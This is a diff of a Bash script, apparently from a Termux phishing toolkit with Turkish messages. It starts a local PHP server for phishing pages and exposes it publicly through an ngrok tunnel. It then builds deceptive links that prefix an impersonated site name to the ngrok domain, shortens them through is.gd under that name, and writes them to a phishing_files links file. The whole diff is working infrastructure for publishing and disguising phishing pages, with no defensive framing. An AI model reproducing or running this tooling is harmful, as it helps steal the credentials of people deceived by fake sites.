@@ -49,11 +49,15 @@ fi
 
 ####################
 
-# WEB TOOLS #
+# WİT #
 
 ####################
 
-_web_tools() {
+_wit() {
+if [[ ! -a $PREFIX/bin/ngrok ]];then
+	am start -a android.intent.action.VIEW http://localhost:4444/phishing-tools/phishing_files/error.php
+	exit
+fi
 if [[ ! -a information ]];then
 	echo
 	echo
@@ -64,31 +68,21 @@ if [[ ! -a information ]];then
 	echo
 	exit
 fi
-while :
-do
-	konum="/data/data/com.termux/files/usr/lib/termux-web-tools"
-	eski_link_kontrol=$(tree -i -f $konum |grep linkler.txt |wc -l)
-	if [[ $eski_link_kontrol == 1 ]];then
-		rm $(tree -i -f $konum |grep linkler.txt)
-	else
-		break
-	fi
-done
-
-control=$(ps aux |grep "ngrok" |grep -v grep |grep -o ngrok)
-if [[ $control == ngrok ]];then
+control=$(ps aux |grep "ngrok" |grep -v grep |grep -o http)
+if [[ -n $control ]];then
 	killall ngrok
-	#termux-web-tools
 fi
-
+control=$(ps aux |grep php |grep -v grep |grep 127.0.0.1 |grep -v 4444 |awk '{print $2}')
+if [[ -n $control ]];then
+	kill -9 $control
+fi
 port="4545"
 site=$(cat information |sed -n 1p)
 site_name=$(cat information |sed -n 2p)
-control=$(ps aux |grep -o "ngrok http $port" |wc -l)
 
-if [[ $control == 1 ]];then
+if [[ -a $PREFIX/bin/ngrok ]];then
 	php -S 127.0.0.1:$port & ngrok http $port > /dev/null &
-	end=$((SECONDS+15))
+	end=$((SECONDS+60))
 	while [ $SECONDS -lt $end ];
 	do
 		control=$(curl -s http://127.0.0.1:4040/api/tunnels |grep -o \"https://[a-z.0-9.A-Z.]\*.ngrok.io\" |tr -d '"' |wc -l)
@@ -96,26 +90,26 @@ if [[ $control == 1 ]];then
 			break
 		fi
 	done
-
+	if [[ $control != 1 ]];then
+		am start -a android.intent.action.VIEW http://localhost:4444/phishing-tools/phishing_files/error.php
+		exit
+	fi
 	url=$(curl -s http://127.0.0.1:4040/api/tunnels |grep -o \"https://[a-z.0-9.A-Z.]\*.ngrok.io\" |tr -d '"')
 	domain=$(echo -e "$url" |grep -o /[a-z.0-9.A-Z.]\*.ngrok.io |tr -d '/')
-	ozellink=$(curl -s -X POST "https://is.gd/create.php" -d url="$url" -d shorturl="$site_name$(date +%d%m%G%H%S)")
-	link3=$(echo -e "$ozellink" |grep -o is.gd/[A-Z.a-z.0-9]\* |sed -n 1p)
-	konum=$(pwd |awk -F "termux-web-tools" {'print $2'})
+	special_link=$(curl -s -X POST "https://is.gd/create.php" -d url="$url" -d shorturl="$site_name$(date +%d%m%G%H%S)")
+	link3=$(echo -e "$special_link" |grep -o is.gd/[A-Z.a-z.0-9]\* |sed -n 1p)
 	echo -e "
 	<a href=\"$url\">$url</a>
 	<a href=\"$url\">$site$domain</a>
 	<a href=\"$url\">$site$link3</a>
-	<a href=\"$url\">$(echo -e "$ozellink" |grep -o https://is.gd/[A-Z.a-z.0-9]\* |sed -n 1p)</a>
-	<h3><a class=\"back\" href=\"$konum/index.php\">GERİ</a></h3>
-	<h3><a class=\"home\" href=\"/index.php\">ANASAYFA</a></h3>" > /data/data/com.termux/files/usr/lib/termux-web-tools/phishing-tools/phishing_files/linkler.txt
+	<a href=\"$url\">$(echo -e "$special_link" |grep -o https://is.gd/[A-Z.a-z.0-9]\* |sed -n 1p)</a>" > /data/data/com.termux/files/usr/lib/termux-web-tools/files/phishing-tools/phishing_files/links.txt
 	exit
 
 else
 	echo
 	echo
 	echo
-	printf "\e[31m\e[97m LİNK OLUŞTURULURKEN HATA OLUŞTU"
+	printf "\e[1;31m[!] \e[33mNGROK \e[97mBULUNAMADI"
 	echo
 	echo
 	echo
@@ -123,8 +117,8 @@ else
 		
 fi
 }
-if [[ $1 == --web-tools ]];then
-	_web_tools
+if [[ $1 == --wit ]];then
+	_wit
 	exit
 fi
 
@@ -222,8 +216,8 @@ if [[ $1 == --port || $1 == -p ]];then
 	echo
 	echo
 	printf "\e[1;31m[\e[97m2\e[31m]\e[97m $(cat information |sed -n 1p)$domain"
-	ozellink=$(curl -s -X POST "https://is.gd/create.php" -d url="$url" -d shorturl="$(cat information |sed -n 2p)$(date +%d%m%G%H%S)")
-	link3=$(echo -e "$ozellink" |grep -o is.gd/[A-Z.a-z.0-9]\* |sed -n 1p)
+	special_link=$(curl -s -X POST "https://is.gd/create.php" -d url="$url" -d shorturl="$(cat information |sed -n 2p)$(date +%d%m%G%H%S)")
+	link3=$(echo -e "$special_link" |grep -o is.gd/[A-Z.a-z.0-9]\* |sed -n 1p)
 	echo
 	echo
 	echo
@@ -231,7 +225,7 @@ if [[ $1 == --port || $1 == -p ]];then
 	echo
 	echo
 	echo
-	printf "\e[1;31m[\e[97m4\e[31m]\e[97m $(echo -e "$ozellink" |grep -o https://is.gd/[A-Z.a-z.0-9]\* |sed -n 1p)"
+	printf "\e[1;31m[\e[97m4\e[31m]\e[97m $(echo -e "$special_link" |grep -o https://is.gd/[A-Z.a-z.0-9]\* |sed -n 1p)"
 	echo
 	echo
 	echo
